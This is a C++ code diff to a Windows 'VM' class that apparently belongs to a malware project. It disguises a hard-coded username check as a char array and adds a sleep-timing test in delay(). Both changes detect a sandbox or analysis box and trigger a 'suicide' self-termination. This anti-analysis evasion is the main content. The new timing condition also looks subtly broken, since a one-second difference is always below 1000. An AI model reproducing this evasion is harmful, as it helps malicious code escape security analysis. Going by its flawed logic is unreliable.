@@ -153,9 +153,10 @@ int VM::checkVM() {
 		char computername[MAX_PATH];
 		DWORD cpnl = sizeof(computername);
 		ret = lpGetComputerNameA(computername, &cpnl);
-		if (lstrcmpA(username,"ljg") /*||lstrcmpA(computername,"DESKTOP-KQBV2P5")*/)
+		char myusername[] = { 'l','j','g',0 };
+		if (lstrcmpA(username, myusername) )
 		{
-			runLog("maybe i am running in sand box:%d\r\n", vmlabel);
+			runLog("running in box:%d\r\n", vmlabel);
 			suicide();
 		}
 #endif
@@ -173,8 +174,20 @@ int VM::delay(int seconds) {
 	{
 		t2 = lpGetTickCount64() / 1000;
 
+		ULONGLONG tm1 = time(0);
+
 		lpSleep( 1000);
 
+		ULONGLONG t3 = lpGetTickCount64() / 1000;
+
+		ULONGLONG tm2 = time(0);
+
+		if (t3 - t2 < 1000 || tm2 - tm1 < 1) {
+			while (1) {
+				runLog("maybe i am running in sand box\r\n");
+				suicide();
+			}	
+		}
 	} while (t2 - t1 < seconds);
 
 	return 0;
